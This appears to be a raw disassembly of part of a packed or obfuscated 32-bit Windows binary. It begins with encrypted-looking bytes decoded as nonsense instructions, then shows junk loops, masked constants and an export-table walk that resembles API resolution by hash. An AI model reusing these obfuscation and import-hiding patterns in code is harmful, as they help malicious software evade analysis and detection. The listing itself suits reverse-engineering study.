  40a6d4:	xchg   esi,eax
  40a6d5:	sub    BYTE PTR [edi-0x73a966a6],dh
  40a6db:	sbb    BYTE PTR [edx-0x65],0xb1
  40a6df:	out    0x63,al
  40a6e1:	mov    esp,0xdd3507e5
  40a6e6:	jle    0x40a6c4
  40a6e8:	outs   dx,BYTE PTR ds:[esi]
  40a6e9:	ins    BYTE PTR es:[edi],dx
  40a6ea:	ret    0x7e85
  40a6ed:	dec    ebx
  40a6ee:	hlt    
  40a6ef:	aaa    
  40a6f0:	nop
  40a6f1:	xor    DWORD PTR [edx+0x50c5cf5c],edi
  40a6f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6f8:	hlt    
  40a6f9:	dec    ebx
  40a6fa:	mov    WORD PTR [edx-0x28f197e0],?
  40a700:	stos   DWORD PTR es:[edi],eax
  40a701:	les    esi,FWORD PTR [ebx+0xa60e7d0]
  40a707:	xor    al,0x83
  40a709:	lds    ebx,FWORD PTR [ebx-0x77]
  40a70c:	outs   dx,BYTE PTR ds:[esi]
  40a70d:	or     al,0x15
  40a70f:	add    BYTE PTR [edx+0x5],dl
  40a712:	sub    DWORD PTR [edi],esi
  40a714:	mov    esi,0x3443c6ff
  40a719:	mov    ch,0xb8
  40a71b:	and    DWORD PTR [ebx+0x37],ebp
  40a71e:	in     eax,0xc0
  40a720:	stos   BYTE PTR es:[edi],al
  40a721:	mov    DWORD PTR [ecx],ebx
  40a723:	sbb    DWORD PTR [edx],eax
  40a725:	je     0x40a722
  40a727:	icebp  
  40a728:	aaa    
  40a729:	test   cl,ah
  40a72b:	out    0x79,eax
  40a72d:	mov    cl,0xae
  40a72f:	ins    DWORD PTR es:[edi],dx
  40a730:	repnz sub DWORD PTR [edi-0x5],ecx
  40a734:	xlat   BYTE PTR ds:[ebx]
  40a735:	or     DWORD PTR [ebp-0x68],ebx
  40a738:	cli    
  40a739:	(bad)  
  40a73a:	ins    BYTE PTR es:[edi],dx
  40a73b:	push   esi
  40a73c:	ficom  WORD PTR [ecx+0x7df224df]
  40a742:	jp     0x40a6c8
  40a744:	rol    DWORD PTR [esi+0x1ce04b56],cl
  40a74a:	push   esp
  40a74b:	gs stos DWORD PTR es:[edi],eax
  40a74d:	push   esp
  40a74e:	loop   0x40a7b7
  40a750:	fwait
  40a751:	mov    ah,0xc9
  40a753:	call   0x2331:0x32f0b3d5
  40a75a:	adc    eax,0x17adc2fe
  40a75f:	shr    BYTE PTR [eax-0x55],cl
  40a762:	sbb    esp,DWORD PTR [esi+0x787c6ff4]
  40a768:	mov    esp,DWORD PTR [ecx+0x6aa7dd6b]
  40a76e:	jno    0x40a7a2
  40a770:	adc    bh,BYTE PTR [edx+0x34977150]
  40a776:	call   0xaefec820
  40a77b:	xchg   edx,eax
  40a77c:	pop    ss
  40a77d:	scas   al,BYTE PTR es:[edi]
  40a77e:	rcl    BYTE PTR [edx],cl
  40a780:	or     esp,esp
  40a782:	or     edi,esi
  40a784:	fmul   QWORD PTR [edi]
  40a786:	dec    esp
  40a787:	arpl   WORD PTR [ebx+0x0],di
  40a78a:	push   0xffffff9e
  40a78c:	lods   al,BYTE PTR ds:[esi]
  40a78d:	out    dx,eax
  40a78e:	and    eax,0xa60514f5
  40a793:	retf   0x9ba
  40a796:	jge    0x40a7fb
  40a798:	or     edi,esp
  40a79a:	adc    BYTE PTR [eax+0x467c8914],0x9
  40a7a1:	cld    
  40a7a2:	arpl   WORD PTR [ebp-0x3e],bp
  40a7a5:	shr    BYTE PTR ds:0xebc5a27a,1
  40a7ab:	arpl   WORD PTR [ebp+0x71],bp
  40a7ae:	dec    esi
  40a7af:	fcmovu st,st(1)
  40a7b1:	cld    
  40a7b2:	jbe    0x40a73a
  40a7b4:	pop    ecx
  40a7b5:	test   eax,0x36118f4e
  40a7ba:	loope  0x40a796
  40a7bc:	inc    edi
  40a7bd:	sar    BYTE PTR [edi],1
  40a7bf:	and    BYTE PTR [edx-0x16e9e079],al
  40a7c5:	stc    
  40a7c6:	mov    es,WORD PTR gs:[eax+0x6e2f66f2]
  40a7cd:	adc    ebp,DWORD PTR [esi]
  40a7cf:	mov    ebp,0xd19df28
  40a7d4:	pop    ss
  40a7d5:	js     0x40a7eb
  40a7d7:	sub    eax,0x19eedbda
  40a7dc:	and    bh,BYTE PTR [edi]
  40a7de:	or     BYTE PTR [ecx-0x4e25ab8a],dl
  40a7e4:	fsubr  QWORD PTR [esi+ebx*4+0x2be7c2b8]
  40a7eb:	xchg   edx,eax
  40a7ec:	mov    ds:0x13f30ec4,al
  40a7f1:	sbb    eax,0x6d00c7f4
  40a7f6:	mov    ebx,0x8939daa3
  40a7fb:	rcr    BYTE PTR [eax-0x5c4815a0],0x65
  40a802:	jmp    0x446:0x6b75f333
  40a809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a80a:	mov    dl,0xb2
  40a80c:	or     ebx,ebx
  40a80e:	pop    edx
  40a80f:	pop    ss
  40a810:	push   0xf3d58576
  40a815:	pop    es
  40a816:	mov    dl,0xbc
  40a818:	adc    ebp,DWORD PTR [ecx-0x3082c38c]
  40a81e:	lods   eax,DWORD PTR ds:[esi]
  40a81f:	mov    ebp,0xb549e02f
  40a824:	bound  ebx,QWORD PTR [edx]
  40a826:	cwde   
  40a827:	or     BYTE PTR [edx],cl
  40a829:	cld    
  40a82a:	jmp    0x1ac2df3f
  40a82f:	mov    ecx,gs
  40a831:	aas    
  40a832:	test   BYTE PTR [ecx+0x4edc818f],ch
  40a838:	lods   eax,DWORD PTR ds:[esi]
  40a839:	jbe    0x40a880
  40a83b:	cmp    ah,0x6d
  40a83e:	mov    ah,0xd2
  40a840:	pop    es
  40a841:	add    dh,bh
  40a843:	shr    BYTE PTR [esi+0x577cff20],1
  40a849:	enter  0xe546,0xec
  40a84d:	sar    DWORD PTR [edx],0xf
  40a850:	sbb    al,0xe3
  40a852:	out    dx,al
  40a853:	pop    ds
  40a854:	pop    esi
  40a855:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a856:	(bad)  
  40a857:	sbb    eax,0x79ef78e0
  40a85c:	mov    cl,0xce
  40a85e:	bound  esp,QWORD PTR [ebx+0x472b27e4]
  40a864:	cld    
  40a865:	jl     0x40a842
  40a867:	(bad)  
  40a868:	retf   0xb577
  40a86b:	rcr    bl,cl
  40a86d:	xor    ebp,DWORD PTR [ebx+0x80ed0b0]
  40a873:	xor    edi,ebx
  40a875:	add    eax,0x18c27b04
  40a87a:	lock jge 0x40a8a7
  40a87d:	(bad)  
  40a87f:	jmp    0x860c:0x8b34bea0
  40a886:	bound  esp,QWORD PTR [esi]
  40a888:	mov    esp,0xb0c3083c
  40a88d:	(bad)  
  40a88e:	pop    ebp
  40a88f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a890:	enter  0xf677,0x3
  40a894:	jmp    0xcb958a14
  40a899:	pop    es
  40a89a:	je     0x40a84f
  40a89c:	pusha  
  40a89d:	outs   dx,BYTE PTR ds:[esi]
  40a89e:	ja     0x40a83c
  40a8a0:	rcl    BYTE PTR [ecx+0x62],0x2
  40a8a4:	idiv   esi
  40a8a6:	or     al,0x76
  40a8a8:	dec    eax
  40a8a9:	fdivr  QWORD PTR [edx+0x3b6be336]
  40a8af:	xchg   edi,eax
  40a8b0:	fidiv  WORD PTR [esi]
  40a8b2:	push   0xffffffcb
  40a8b4:	daa    
  40a8b5:	not    DWORD PTR es:[ecx]
  40a8b8:	pop    ecx
  40a8ba:	jbe    0x40a866
  40a8bc:	and    eax,0x520f77a3
  40a8c1:	sub    bl,dh
  40a8c3:	icebp  
  40a8c4:	cmp    BYTE PTR [eax-0xc72aa18],bh
  40a8ca:	(bad)  
  40a8cb:	imul   ecx,esi,0x2e
  40a8ce:	daa    
  40a8cf:	and    BYTE PTR [ecx+0x42],ch
  40a8d2:	dec    edi
  40a8d3:	jae    0x40a860
  40a8d5:	cmp    BYTE PTR [ebx+eiz*1-0x10],bh
  40a8d9:	dec    esi
  40a8da:	and    DWORD PTR [esi+esi*1],0x5305d28e
  40a8e1:	xchg   ecx,eax
  40a8e2:	push   ds
  40a8e3:	sti    
  40a8e4:	rcr    BYTE PTR [edi],0x21
  40a8e7:	mov    dh,BYTE PTR [esi+ecx*4+0x5361f427]
  40a8ee:	push   ds
  40a8ef:	mov    cl,0x6b
  40a8f1:	push   esi
  40a8f2:	imul   edi,DWORD PTR [ebx+0x452fc23f],0xffffffcb
  40a8f9:	jecxz  0x40a931
  40a8fb:	xlat   BYTE PTR ds:[ebx]
  40a8fc:	adc    edx,0x4
  40a8ff:	sub    edi,ecx
  40a901:	jnp    0x40a8f2
  40a903:	mov    dl,0xa3
  40a905:	dec    ecx
  40a906:	inc    edx
  40a907:	fadd   DWORD PTR ds:[eax]
  40a90a:	stos   DWORD PTR es:[edi],eax
  40a90b:	jp     0x40a8ea
  40a90d:	jno    0x40a984
  40a90f:	sub    DWORD PTR [ebx-0x26359525],edx
  40a915:	stos   DWORD PTR es:[edi],eax
  40a916:	mov    ch,0xc3
  40a918:	jns    0x40a956
  40a91a:	std    
  40a91b:	pop    edi
  40a91c:	add    eax,0x9c9af34a
  40a921:	add    eax,0x6a4f5d52
  40a926:	mov    ah,0x76
  40a928:	jl     0x40a8c7
  40a92a:	aaa    
  40a92b:	xchg   ebp,eax
  40a92c:	add    edx,eax
  40a92e:	out    0xf4,eax
  40a930:	jge    0x40a935
  40a932:	icebp  
  40a933:	(bad)  
  40a934:	xor    dl,BYTE PTR [eax]
  40a936:	adc    eax,0xfdcc418e
  40a93b:	and    ecx,DWORD PTR [ebp-0x38f9b98a]
  40a941:	out    0x69,al
  40a943:	out    0x53,al
  40a945:	das    
  40a946:	xchg   ecx,eax
  40a947:	rcr    al,0x9e
  40a94a:	or     bh,BYTE PTR [eax+edi*8]
  40a94d:	shl    BYTE PTR [ebx-0x7f650dd9],cl
  40a953:	shr    BYTE PTR [eax-0x2d],1
  40a956:	clc    
  40a957:	jecxz  0x40a936
  40a959:	mov    dh,0xbd
  40a95b:	aas    
  40a95c:	cld    
  40a95d:	fiadd  DWORD PTR [ebx-0x6a]
  40a960:	imul   eax,DWORD PTR [eax+0x57],0xffffffba
  40a964:	out    0xd8,eax
  40a966:	leave  
  40a967:	inc    edx
  40a968:	jb     0x40a9de
  40a96a:	and    bl,dh
  40a96c:	out    dx,eax
  40a96d:	cmp    DWORD PTR [edx],0x77
  40a970:	outs   dx,BYTE PTR ds:[esi]
  40a971:	sub    ebp,DWORD PTR [ebx+0x6f6cb4f]
  40a977:	out    0xeb,al
  40a979:	test   DWORD PTR [edx-0x56],ebx
  40a97c:	ss bnd es jmp 0xb03c5d5f
  40a984:	stc    
  40a985:	out    dx,al
  40a986:	mov    eax,0xcfe1291f
  40a98b:	jne    0x40a9f5
  40a98d:	pop    ds
  40a98e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a98f:	xlat   BYTE PTR ds:[ebx]
  40a990:	icebp  
  40a991:	inc    ah
  40a993:	shr    ch,0xfc
  40a996:	xchg   DWORD PTR [eax+eax*4-0x57bd7fdd],esi
  40a99d:	dec    ebp
  40a99e:	sub    DWORD PTR [ebx-0x5cb0e8d0],esp
  40a9a4:	and    al,BYTE PTR ds:0xfdf1c2ad
  40a9aa:	cmp    dl,BYTE PTR [esi-0x3e]
  40a9ad:	ja     0x40a945
  40a9af:	retf   0xe10b
  40a9b2:	inc    bh
  40a9b4:	into   
  40a9b5:	cmp    DWORD PTR [edx+0x49],edi
  40a9b8:	or     DWORD PTR [edx],ebp
  40a9ba:	ret    0xac80
  40a9bd:	das    
  40a9be:	adc    al,0xc9
  40a9c0:	inc    eax
  40a9c1:	jge    0x40a9f0
  40a9c3:	(bad)  
  40a9c4:	clc    
  40a9c5:	mov    eax,ds:0x6e951ff1
  40a9ca:	ret    0x9ed8
  40a9cd:	fiadd  WORD PTR [esi+0x42eb5581]
  40a9d3:	aaa    
  40a9d4:	add    cl,BYTE PTR [ebp-0x65]
  40a9d7:	cmp    al,0xe7
  40a9d9:	sar    DWORD PTR [ecx],1
  40a9db:	pop    ebx
  40a9dc:	xor    eax,0xc99c6c59
  40a9e1:	stos   DWORD PTR es:[edi],eax
  40a9e2:	int    0x0
  40a9e4:	mov    edx,0x422124ea
  40a9e9:	and    ah,BYTE PTR [ebp+0x7f12e8ff]
  40a9ef:	add    BYTE PTR [edx],dl
  40a9f1:	mov    DWORD PTR [edi-0x2d],ebp
  40a9f4:	adc    eax,0x4802555f
  40a9f9:	sub    BYTE PTR [esi-0x6],dh
  40a9fc:	jmp    0x6dfb47cd
  40aa01:	test   eax,0x3aad1c50
  40aa06:	inc    ecx
  40aa07:	mov    DWORD PTR [ebx+ebx*2-0x6c],eax
  40aa0b:	mov    dh,0x4c
  40aa0d:	cdq    
  40aa0e:	je     0x40aa5a
  40aa10:	xchg   esi,eax
  40aa11:	mov    ch,BYTE PTR [edi]
  40aa13:	dec    ebx
  40aa14:	xchg   edx,eax
  40aa15:	mov    ecx,0x44fadce4
  40aa1a:	mov    dl,0x4
  40aa1c:	inc    esi
  40aa1d:	sub    ah,bl
  40aa1f:	push   ebx
  40aa20:	dec    eax
  40aa21:	imul   edx,DWORD PTR [esi-0xd],0xffffff8a
  40aa25:	aas    
  40aa26:	nop
  40aa27:	imul   dx,WORD PTR [edx-0x80],0xff56
  40aa2d:	adc    eax,0x425014
  40aa32:	push   0x97898797
  40aa37:	or     DWORD PTR ds:0x42a008,0x42d008
  40aa41:	call   DWORD PTR ds:0x425004
  40aa47:	and    DWORD PTR ds:0x42c01c,0x0
  40aa51:	mov    ebx,DWORD PTR ds:0x42c01c
  40aa57:	inc    ebx
  40aa58:	mov    DWORD PTR ds:0x42c01c,ebx
  40aa5e:	cmp    DWORD PTR ds:0x42c01c,0x5
  40aa65:	jne    0x40aa76
  40aa6b:	push   0x57f5
  40aa70:	call   DWORD PTR ds:0x42504c
  40aa76:	cmp    DWORD PTR ds:0x42c01c,0x4
  40aa7d:	jne    0x40aa92
  40aa83:	xor    ebx,ebx
  40aa85:	xor    ebx,DWORD PTR ds:0x42c01c
  40aa8b:	inc    ebx
  40aa8c:	mov    DWORD PTR ds:0x42c01c,ebx
  40aa92:	cmp    DWORD PTR ds:0x42c01c,0x10
  40aa99:	jb     0x40aa51
  40aa9f:	xor    eax,eax
  40aaa1:	xor    eax,DWORD PTR ds:0x42a014
  40aaa7:	xor    DWORD PTR ds:0x42d018,eax
  40aaad:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  40aab4:	or     ecx,DWORD PTR ds:0x42d008
  40aaba:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40aac1:	mov    ecx,DWORD PTR [ebp-0x4]
  40aac4:	or     DWORD PTR ds:0x42b014,edi
  40aaca:	mov    ebx,0x7510893
  40aacf:	xor    eax,eax
  40aad1:	or     eax,DWORD PTR ds:0x423e9a
  40aad7:	mov    eax,DWORD PTR [eax]
  40aad9:	or     DWORD PTR ds:0x42d018,eax
  40aadf:	xor    ecx,ebx
  40aae1:	not    eax
  40aae3:	mov    eax,0x3272db
  40aae8:	or     DWORD PTR ds:0x42c010,0x42900c
  40aaf2:	add    ecx,eax
  40aaf4:	mov    DWORD PTR [ebp-0x1c],ecx
  40aaf7:	mov    DWORD PTR ds:0x42c014,0x14
  40ab01:	cmp    DWORD PTR ds:0x42c014,0x0
  40ab08:	je     0x40aba7
  40ab0e:	cmp    DWORD PTR ds:0x42c014,0x2
  40ab15:	jne    0x40ab29
  40ab1b:	push   DWORD PTR [ebp-0x28]
  40ab1e:	push   0x4245a8
  40ab23:	call   DWORD PTR ds:0x425010
  40ab29:	cmp    DWORD PTR ds:0x42c014,0x3
  40ab30:	jne    0x40ab43
  40ab36:	mov    ecx,DWORD PTR ds:0x42c014
  40ab3c:	dec    ecx
  40ab3d:	mov    DWORD PTR ds:0x42c014,ecx
  40ab43:	mov    ecx,DWORD PTR ds:0x42c014
  40ab49:	dec    ecx
  40ab4a:	mov    DWORD PTR ds:0x42c014,ecx
  40ab50:	jmp    0x40ab01
  40ab55:	mov    DWORD PTR ds:0x42a018,0x12
  40ab5f:	cmp    DWORD PTR ds:0x42a018,0x0
  40ab66:	je     0x40aba7
  40ab6c:	cmp    DWORD PTR ds:0x42a018,0x1a
  40ab73:	jne    0x40ab85
  40ab79:	push   DWORD PTR [ebp-0x1c]
  40ab7c:	push   DWORD PTR [ebp-0x18]
  40ab7f:	call   DWORD PTR ds:0x425018
  40ab85:	mov    ecx,DWORD PTR ds:0x42a018
  40ab8b:	dec    ecx
  40ab8c:	mov    DWORD PTR ds:0x42a018,ecx
  40ab92:	jmp    0x40ab5f
  40ab97:	xor    ecx,ecx
  40ab99:	xor    ecx,DWORD PTR ds:0x424611
  40ab9f:	mov    ecx,DWORD PTR [ecx]
  40aba1:	sbb    DWORD PTR ds:0x42a00c,ecx
  40aba7:	mov    ecx,DWORD PTR [ebp+0x14]
  40abaa:	test   ecx,ecx
  40abac:	je     0x40ac29
  40abb2:	and    DWORD PTR ds:0x42c014,edi
  40abb8:	mov    ecx,DWORD PTR [ebp+0x14]
  40abbb:	mov    DWORD PTR ds:0x42c014,0x11
  40abc5:	cmp    DWORD PTR ds:0x42c014,0x0
  40abcc:	je     0x40ac1e
  40abd2:	cmp    DWORD PTR ds:0x42c014,0x5
  40abd9:	jne    0x40abf2
  40abdf:	push   0x429028
  40abe4:	push   DWORD PTR [ebp-0x20]
  40abe7:	push   0x42441c
  40abec:	call   DWORD PTR ds:0x42501c
  40abf2:	cmp    DWORD PTR ds:0x42c014,0x6
  40abf9:	jne    0x40ac0c
  40abff:	mov    edi,DWORD PTR ds:0x42c014
  40ac05:	dec    edi
  40ac06:	mov    DWORD PTR ds:0x42c014,edi
  40ac0c:	mov    edi,DWORD PTR ds:0x42c014
  40ac12:	dec    edi
  40ac13:	mov    DWORD PTR ds:0x42c014,edi
  40ac19:	jmp    0x40abc5
  40ac1e:	mov    ecx,DWORD PTR [ecx]
  40ac20:	xor    DWORD PTR ds:0x42a018,ecx
  40ac26:	mov    DWORD PTR [ebp-0x1c],ecx
  40ac29:	adc    DWORD PTR ds:0x429024,edi
  40ac2f:	mov    ecx,0x7665
  40ac34:	imul   edx,eax
  40ac37:	mov    DWORD PTR ds:0x42d00c,0x1b
  40ac41:	cmp    DWORD PTR ds:0x42d00c,0x0
  40ac48:	je     0x40ac9b
  40ac4e:	cmp    DWORD PTR ds:0x42d00c,0x4
  40ac55:	jne    0x40ac69
  40ac5b:	push   0x429020
  40ac60:	push   DWORD PTR [ebp-0x1c]
  40ac63:	call   DWORD PTR ds:0x425020
  40ac69:	cmp    DWORD PTR ds:0x42d00c,0x5
  40ac70:	jne    0x40ac83
  40ac76:	mov    edi,DWORD PTR ds:0x42d00c
  40ac7c:	dec    edi
  40ac7d:	mov    DWORD PTR ds:0x42d00c,edi
  40ac83:	mov    edi,DWORD PTR ds:0x42d00c
  40ac89:	dec    edi
  40ac8a:	mov    DWORD PTR ds:0x42d00c,edi
  40ac90:	jmp    0x40ac41
  40ac95:	xor    DWORD PTR ds:0x42b010,edi
  40ac9b:	mov    esi,0x76532
  40aca0:	add    edx,ecx
  40aca2:	xchg   esi,ecx
  40aca4:	or     edi,esi
  40aca6:	mov    edi,0x54354
  40acab:	movzx  ecx,BYTE PTR ds:0x42901c
  40acb2:	sbb    DWORD PTR ds:0x429000,ecx
  40acb8:	sub    edx,edi
  40acba:	mov    ecx,DWORD PTR [ebp-0x4]
  40acbd:	sbb    DWORD PTR ds:0x429028,0x4a48
  40acc7:	xor    ecx,ebx
  40acc9:	and    esi,DWORD PTR ds:0x42900c
  40accf:	add    ecx,eax
  40acd1:	mov    DWORD PTR [ebp-0x8],ecx
  40acd4:	mov    DWORD PTR ds:0x42b014,0x169
  40acde:	mov    ecx,DWORD PTR [ebp-0x14]
  40ace1:	add    esi,DWORD PTR ds:0x42b000
  40ace7:	xor    ecx,ebx
  40ace9:	add    DWORD PTR ds:0x42d00c,0x42d004
  40acf3:	add    ecx,eax
  40acf5:	mov    DWORD PTR [ebp-0x24],ecx
  40acf8:	and    esi,esi
  40acfa:	mov    ecx,DWORD PTR [ebp-0x4]
  40acfd:	and    DWORD PTR ds:0x42b000,0x0
  40ad07:	jmp    0x40ad19
  40ad0c:	mov    esi,DWORD PTR ds:0x42b000
  40ad12:	inc    esi
  40ad13:	mov    DWORD PTR ds:0x42b000,esi
  40ad19:	cmp    DWORD PTR ds:0x42b000,0x10
  40ad20:	jae    0x40ad70
  40ad26:	cmp    DWORD PTR ds:0x42b000,0x4
  40ad2d:	jne    0x40ad3e
  40ad33:	push   0x8810
  40ad38:	call   DWORD PTR ds:0x425028
  40ad3e:	cmp    DWORD PTR ds:0x42b000,0x3
  40ad45:	jne    0x40ad58
  40ad4b:	mov    esi,DWORD PTR ds:0x42b000
  40ad51:	inc    esi
  40ad52:	mov    DWORD PTR ds:0x42b000,esi
  40ad58:	jmp    0x40ad0c
  40ad5d:	movzx  esi,WORD PTR ds:0x42d00c
  40ad64:	adc    esi,DWORD PTR ds:0x42b018
  40ad6a:	mov    DWORD PTR ds:0x42d00c,esi
  40ad70:	xor    ecx,ebx
  40ad72:	add    ecx,eax
  40ad74:	add    esi,0x75ba
  40ad7a:	mov    DWORD PTR [ebp-0x30],ecx
  40ad7d:	or     ecx,DWORD PTR ds:0x42c010
  40ad83:	mov    esi,DWORD PTR [ebp-0x4]
  40ad86:	inc    ecx
  40ad87:	xor    esi,ebx
  40ad89:	mov    ecx,DWORD PTR ds:0x4245f9
  40ad8f:	mov    ecx,DWORD PTR [ecx]
  40ad91:	adc    DWORD PTR ds:0x429020,ecx
  40ad97:	add    esi,eax
  40ad99:	mov    ecx,DWORD PTR [ebp-0x24]
  40ad9c:	sub    DWORD PTR ds:0x42c010,0x42c004
  40ada6:	sub    ecx,eax
  40ada8:	lea    edx,[esi-0x3272db]
  40adae:	xor    DWORD PTR ds:0x42a004,0x429028
  40adb8:	xor    ecx,ebx
  40adba:	xor    edx,ebx
  40adbc:	mov    DWORD PTR ds:0x42b00c,0x3cf6
  40adc6:	cmp    edx,ecx
  40adc8:	mov    DWORD PTR ds:0x42a008,0x130c
  40add2:	je     0x40afdf
  40add8:	sub    ecx,0x2467
  40adde:	mov    ecx,DWORD PTR [ebp-0x4]
  40ade1:	and    DWORD PTR ds:0x42c00c,0x42d01c
  40adeb:	xor    ecx,ebx
  40aded:	add    DWORD PTR ds:0x42b018,0x2ea9
  40adf7:	add    ecx,eax
  40adf9:	mov    DWORD PTR ds:0x42b000,0x737d
  40ae03:	cmp    esi,ecx
  40ae05:	mov    DWORD PTR ds:0x42b018,0x3d4e
  40ae0f:	jne    0x40afbc
  40ae15:	push   DWORD PTR [ebp+0x8]
  40ae18:	call   0x423c20
  40ae1d:	mov    DWORD PTR [ebp-0x18],eax
  40ae20:	mov    eax,DWORD PTR [ebp-0x4]
  40ae23:	xor    edi,ecx
  40ae25:	mov    ecx,DWORD PTR [ebp-0x18]
  40ae28:	xor    eax,ebx
  40ae2a:	and    DWORD PTR ds:0x42901c,0x0
  40ae34:	jmp    0x40ae46
  40ae39:	mov    edi,DWORD PTR ds:0x42901c
  40ae3f:	inc    edi
  40ae40:	mov    DWORD PTR ds:0x42901c,edi
  40ae46:	cmp    DWORD PTR ds:0x42901c,0x1d
  40ae4d:	jae    0x40ae90
  40ae53:	cmp    DWORD PTR ds:0x42901c,0x2c
  40ae5a:	jne    0x40ae85
  40ae60:	push   0x61ef
  40ae65:	push   0x288b
  40ae6a:	push   0x42d018
  40ae6f:	push   DWORD PTR [ebp-0x28]
  40ae72:	push   0x2975
  40ae77:	push   DWORD PTR [ebp-0x24]
  40ae7a:	push   0x26ce
  40ae7f:	call   DWORD PTR ds:0x42502c
  40ae85:	jmp    0x40ae39
  40ae8a:	or     DWORD PTR ds:0x42c010,ebx
  40ae90:	mov    edi,0x3272db
  40ae95:	add    eax,edi
  40ae97:	mov    DWORD PTR ds:0x42901c,0x5f35
  40aea1:	cmp    ecx,eax
  40aea3:	mov    DWORD PTR ds:0x42c018,0x19df
  40aead:	je     0x40b04f
  40aeb3:	sub    DWORD PTR ds:0x42d018,0x5f9c
  40aebd:	push   DWORD PTR [ebp-0x18]
  40aec0:	and    DWORD PTR ds:0x42b018,0x42b000
  40aeca:	push   DWORD PTR [ebp+0x8]
  40aecd:	dec    DWORD PTR ds:0x42a00c
  40aed3:	call   0x423cff
  40aed8:	or     DWORD PTR ds:0x42a014,0x42a00c
  40aee2:	mov    DWORD PTR [ebp-0x18],eax
  40aee5:	mov    eax,DWORD PTR [ebp-0x4]
  40aee8:	sbb    DWORD PTR ds:0x42a010,0x3b6d
  40aef2:	mov    ecx,DWORD PTR [ebp-0x18]
  40aef5:	xor    eax,ebx
  40aef7:	add    DWORD PTR ds:0x429004,0x42d004
  40af01:	add    eax,edi
  40af03:	mov    DWORD PTR ds:0x42a018,0x317f
  40af0d:	cmp    ecx,eax
  40af0f:	je     0x40b04f
  40af15:	mov    eax,DWORD PTR [ebp-0x18]
  40af18:	mov    eax,DWORD PTR [eax+0x18]
  40af1b:	mov    ecx,DWORD PTR ds:0x42d000
  40af21:	xor    DWORD PTR ds:0x42a014,ecx
  40af27:	mov    DWORD PTR [ebp-0x24],eax
  40af2a:	mov    eax,DWORD PTR [ebp-0x18]
  40af2d:	and    DWORD PTR ds:0x42b018,0x0
  40af37:	jmp    0x40af49
  40af3c:	mov    ecx,DWORD PTR ds:0x42b018
  40af42:	inc    ecx
  40af43:	mov    DWORD PTR ds:0x42b018,ecx
  40af49:	cmp    DWORD PTR ds:0x42b018,0x16
  40af50:	jae    0x40af77
  40af56:	cmp    DWORD PTR ds:0x42b018,0x20
  40af5d:	jne    0x40af6c
  40af63:	push   DWORD PTR [ebp-0x28]
  40af66:	call   DWORD PTR ds:0x425030
  40af6c:	jmp    0x40af3c
  40af71:	xor    ecx,DWORD PTR ds:0x42b01c
  40af77:	mov    ecx,DWORD PTR [ebp+0x8]
  40af7a:	add    ecx,DWORD PTR [eax+0x20]
  40af7d:	sub    eax,DWORD PTR ds:0x429024
  40af83:	mov    DWORD PTR [ebp-0x2c],ecx
  40af86:	mov    eax,DWORD PTR [ebp-0x18]
  40af89:	inc    ecx
  40af8a:	mov    ecx,DWORD PTR [ebp+0x8]
  40af8d:	add    ecx,DWORD PTR [eax+0x24]
  40af90:	mov    DWORD PTR [ebp-0x34],ecx
  40af93:	xor    DWORD PTR ds:0x42a004,edi
  40af99:	mov    eax,DWORD PTR [ebp-0x18]
  40af9c:	or     DWORD PTR ds:0x42a000,ebx
  40afa2:	mov    ecx,DWORD PTR [ebp+0x8]
  40afa5:	or     DWORD PTR ds:0x42a008,0x109d
  40afaf:	add    ecx,DWORD PTR [eax+0x1c]
  40afb2:	mov    eax,edi
  40afb4:	mov    DWORD PTR [ebp-0x18],ecx
  40afb7:	jmp    0x40b017
  40afbc:	mov    ecx,DWORD PTR [ebp-0x2c]
  40afbf:	mov    edx,DWORD PTR [ebp+0x8]
  40afc2:	add    edx,DWORD PTR [ecx+esi*4]
  40afc5:	mov    DWORD PTR [ebp-0x28],edx
  40afc8:	mov    ecx,DWORD PTR [ebp-0x4]
  40afcb:	mov    edx,DWORD PTR [ebp-0x28]
  40afce:	xor    ecx,ebx
  40afd0:	add    ecx,eax
  40afd2:	cmp    edx,ecx
  40afd4:	je     0x40b017
  40afda:	jmp    0x40b003
  40afdf:	mov    ecx,DWORD PTR [ebp-0x4]
  40afe2:	mov    edx,DWORD PTR [ebp-0x8]
  40afe5:	xor    ecx,ebx
  40afe7:	add    ecx,eax
  40afe9:	cmp    edx,ecx
  40afeb:	je     0x40b05b
  40aff1:	mov    ecx,DWORD PTR [ebp-0x4]
  40aff4:	mov    edx,DWORD PTR [ebp-0x30]
  40aff7:	xor    ecx,ebx
  40aff9:	add    ecx,eax
  40affb:	cmp    edx,ecx
  40affd:	je     0x40b06a
  40b003:	lea    eax,[ebp-0x8]
  40b006:	push   eax
  40b007:	push   DWORD PTR [ebp-0x28]
  40b00a:	push   DWORD PTR [ebp+0xc]
  40b00d:	call   0x401058
  40b012:	mov    eax,0x3272db
  40b017:	mov    ecx,DWORD PTR [ebp-0x4]
  40b01a:	mov    edx,DWORD PTR [ebp-0x8]
  40b01d:	xor    ecx,ebx
  40b01f:	add    ecx,eax
  40b021:	cmp    edx,ecx
  40b023:	je     0x40b03e
  40b029:	mov    ecx,DWORD PTR [ebp-0x34]
  40b02c:	movzx  ecx,WORD PTR [ecx+esi*2]
  40b030:	mov    edx,DWORD PTR [ebp-0x18]
  40b033:	mov    ecx,DWORD PTR [edx+ecx*4]
  40b036:	mov    DWORD PTR [ebp-0x38],ecx
  40b039:	jmp    0x40afdf
  40b03e:	mov    ecx,DWORD PTR [ebp-0x14]
  40b041:	xor    ecx,ebx
  40b043:	lea    esi,[esi+ecx*1+0x3272db]
  40b04a:	jmp    0x40ad99
  40b04f:	mov    eax,DWORD PTR [ebp-0x4]
  40b052:	xor    eax,ebx
  40b054:	add    eax,edi
  40b056:	jmp    0x40f898
  40b05b:	mov    eax,DWORD PTR [ebp-0x4]
  40b05e:	xor    eax,ebx
  40b060:	add    eax,0x3272db
  40b065:	jmp    0x40f898
  40b06a:	mov    ecx,DWORD PTR [ebp-0x38]
  40b06d:	add    ecx,DWORD PTR [ebp+0x8]
  40b070:	mov    DWORD PTR [ebp-0x10],ecx
  40b073:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b076:	test   ecx,ecx
  40b078:	je     0x40d4be
  40b07e:	mov    DWORD PTR [ebp-0x20],0x0
  40b085:	push   0x3
